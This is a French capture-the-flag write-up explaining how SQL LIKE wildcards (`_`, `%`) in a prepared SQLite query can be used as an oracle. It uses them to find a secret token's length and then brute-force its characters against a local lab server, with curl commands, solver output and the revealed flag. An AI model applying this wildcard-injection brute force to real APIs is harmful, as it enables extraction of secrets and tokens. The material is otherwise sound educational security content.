# Writeup 🌶️🌶️🌶️ SQL Me

Dans ce mini challenge PHP de moins de 20 lignes, il faut retrouver le "super token" qui permet d'obtenir le flag.

Ce token est stocké dans une base de données SQLite. Une requête préparée permet d'interroger la BDD :

```php
$stmt = $db->prepare('SELECT token FROM api_tokens WHERE token LIKE :cond AND is_super_token=1');
$stmt->bindValue(':cond', "%$super_token%", SQLITE3_TEXT);
```

A priori, pas d'injection SQL mais... l'utilisation d'une condition avec `LIKE` est intéressante.

## Longueur du token

Dans un `LIKE` en SQL, le caractère `%` est un wildcard qui permet de matcher 0 ou plus caractères.

Il existe un autre wildcard : `_`. Celui-ci permet de matcher n'importe quel caractère **exactement** une fois. Cela va nous permettre de déterminer la longueur du token.

Imaginons que le token stocké en BDD ait la valeur `foobar`.

```sql
SELECT token from api_token WHERE token LIKE '%_%' -- retourne foobar parce que la longueur >= 1

SELECT token from api_token WHERE token LIKE '%______%' -- (6*'_') retourne foobar parce que la longueur >= 6

SELECT token from api_token WHERE token LIKE '%_______%' -- (7*'_') ne retourne rien car aucune valeur a une longueur >= 7
```

On utilise la même méthode pour trouver la longueur du token dans notre challenge :

```console
pun@ctf:~$ curl `python3 -c "print('http://127.0.0.1:45004/?token='+'_'*20)"`
Error: invalid token.

pun@ctf:~$ curl `python3 -c "print('http://127.0.0.1:45004/?token='+'_'*21)"`
Error: invalid token.

pun@ctf:~$ curl `python3 -c "print('http://127.0.0.1:45004/?token='+'_'*22)"`
Error: token not found.
```

On détermine ainsi que le token a une longueur de 21 caractères.

## Bruteforce

Si on reprend notre exemple de la valeur `foobar` en BDD, on comprend rapidement qu'il devient possible de trouver la valeur en itérant les caractères un à un :

```sql
SELECT token from api_token WHERE token LIKE '%a_____%' -- ne retourne rien
SELECT token from api_token WHERE token LIKE '%f_____%' -- retourne foobar

SELECT token from api_token WHERE token LIKE '%fn____%' -- ne retourne rien
SELECT token from api_token WHERE token LIKE '%fo____%' -- retourne foobar
```

En continuant comme ça, on se dit que c'est trivial. Il y a cependant plusieurs problèmes :
- `LIKE` est insensible à la casse, donc `%FOO___%` et `%foO___` retourne le même résultat
- Et si le token à trouver est `this_string_is_100%_legit` ? Comment savoir si un caractère vaut `%` ou `_` ? On peut penser qu'il suffit d'échapper ses caractères mais à la date de ce writeup, pour les échapper il faut écrire une requête SQL comme ceci : `SELECT token from api_tokens LIKE '%this\_string%' ESCAPE '\'`. Or dans notre cas, à cause de la requête préparée, on ne peut pas sortir de notre chaine de caractères.

La stratégie à adopter pour résoudre le challenge est celle-ci :
1. on bruteforce la longueur du token
2. on bruteforce chaque caractère en lowercase en excluant `%` et `_`. Si rien n'est trouvé, on suppose que ce caractère est l'un des deux wildcards.
3. on génère une liste de toutes les tokens possibles en permutant les `%` et `_`
4. de cette liste, on génère toutes les combinaisons possible sensible à la casse. Par exemple, si notre liste de permutations est `['a_b5', 'a%b5']`, les combinaisons à générer sont : `['a_b5', 'A_b5', 'A_B5', 'a_B5', 'a%b5', 'A%b5', ... ]`
5. on bruteforce chaque token de notre liste en intérrogeant l'API jusqu'à obtenir le fag.

C'est l'heure de scripter =) (voir les fichiers `sqlme_solve.php` et `sqlme_solve.py` en fonction de vos affinités de langage)

## Flag time !

```console
pun@ctf:~$ php sqlme_solve.php 
# Step 1: Guessing token length...
 |__ length=21

# Step 2: Guessing lowercase token...
 |__ l1k3_=c0nd_1nj3ct10n!

# Step 3: Permumations of '%' and '_'
 |__ l1k3_=c0nd_1nj3ct10n!
 |__ l1k3_=c0nd%1nj3ct10n!
 |__ l1k3%=c0nd_1nj3ct10n!
 |__ l1k3%=c0nd%1nj3ct10n!

# Step 4: Case sensitive combinaisons
 |__ 4096 tokens generated.

# Step 5: Bruteforce
 |__ [2356/4096] L1K3%=C0Nd_1nj3ct10N!

# Result
 |__ URL: /?token=L1K3%25%3DC0Nd_1nj3ct10N%21
 |__ MSG: Hello Senpai ! 🚩 brb{BugB0unty_St0ry_bY_Geluchat_@Laluka_Twitch}
```

# Credit

Ce chall a été fortement inspiré d'un stream de [Laluka](https://x.com/TheLaluka) où [Geluchat](https://x.com/geluchat) a partagé un cas de Bug Bounty =)

Le replay (à partir de 25min57) : https://www.youtube.com/watch?v=audf3luSSgg&t=1557s
